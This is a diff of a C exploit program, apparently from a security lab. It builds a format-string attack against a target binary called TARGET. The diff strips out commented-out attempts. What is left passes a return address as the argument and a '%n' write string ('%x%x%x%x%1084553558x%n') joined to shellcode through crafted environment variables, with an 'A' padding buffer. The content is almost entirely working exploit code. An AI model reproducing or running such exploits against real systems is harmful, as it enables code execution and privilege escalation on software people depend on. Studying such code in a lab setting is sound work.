@@ -14,80 +14,20 @@ int main(void)
   char *env[20	];
   int bsize = DEFAULT_BUFFER_SIZE;
   char* buff, *ptr;	
-  /*
-  if(!(buff = (char*)malloc(bsize * sizeof(char)))){
-	  printf("can't allocate memory\n");
-	  exit(0);	
-  }
 
-  unsigned long *add_ptr;
-*/
   int i;
-/*
- for (i = 0; i < 60; i++){
-	  buff[i] = 'A';
-  }
-  */
-
-  //ptr = buff + 60;
   
-
 	
   int count = 0;
 
   char * s = "\x68\xfe\xa4\x40";
-  /*
-  while(*s){
- 	 *ptr++ = *s++;
-	 count++;
-  }
-  */
-  /*
-  ptr = ptr + 12;
-  char* s1 = "\x69\xfe\xa4\x40";
-  while(*s1){
- 	 *ptr++ = *s1++;
-	 count++;
-  }
-  ptr = ptr + 12;
-  char* s2 = "\x70\xfe\xa4\x40";
-  while(*s2){
- 	 *ptr++ = *s2++;
-	 count++;
-  }
-  ptr = ptr + 12;
-  char* s3 = "\x71\xfe\xa4\x40";
-  while(*s3){
- 	 *(ptr++) = *(s3++);
-	 count++;
-  }
-
-
-  ptr = buff + 60 + 56 ;
-  for (i=0; i< strlen(shellcode); i++){
-  	*(ptr++) = shellcode[i];
-	
-  }
-
-  ptr = buff + 60 + 56 + strlen(shellcode);
-  
-  while(*r){
- 	 *(ptr++) = *(r++);
-	 
-  }
- */
-
-  //printf("the length of buff after concatenating is %d\n ",strlen(buff));
-  //printf("the buff after concatenating is %s\n ",buff);
 
   args[0] = TARGET; 
   args[1] = s;
   args[2] = NULL;
-  //char* r = "%x%x%x%x%93x%hhn%97x%hhn%171x%hhn%156x%hhn";
-  //char* r = "%1$16u%2$n";1084553624
+
   char* r = "%x%x%x%x%1084553558x%n";
-  //char* r = "%x%x%x%x%93x%hhn%95x%hhn%169x%hhn%154x%hhn";
-  //char* r = "%08x.%08x.%08x.%08x.%08x.%n.%08x.%08x.%08.%08x.%08x.%08x.%08x.%08x\n";
+
   env[0] = "\x00";
   env[1] = "\x00";
   env[2] = "\x00";
@@ -107,19 +47,7 @@ int main(void)
   env[16] = "\x00";
   env[17] = "\x00";
   env[18] = strcat(shellcode,r);
-  //env[18] = r;
-  /*
-  for (i = 0; i<41; i++){
-	if (i == 4) env[i] = "\x69\xfe\xa4\x40";
-	else if (i == 23) env[i] = "\x70\xfe\xa4\x40";
-	else if (i == 35) env[i] = "\x71\xfe\xa4\x40";
-	else if (i == 8) env[i] = "AAAAAAAA";
-	else if (i == 39) env[i] = shellcode;
-	else if (i == 40) env[i] = r;
-	else env[i] = "\x00";
-	
-  }
-*/
+
   char * nop;
    if(!(nop = (char*)malloc(150 * sizeof(char)))){
 	  printf("can't allocate memory\n");
@@ -129,7 +57,6 @@ int main(void)
   	nop[i] = 'A';
   }
   
-  printf("%s",nop);
   env[19] = nop;
   
 
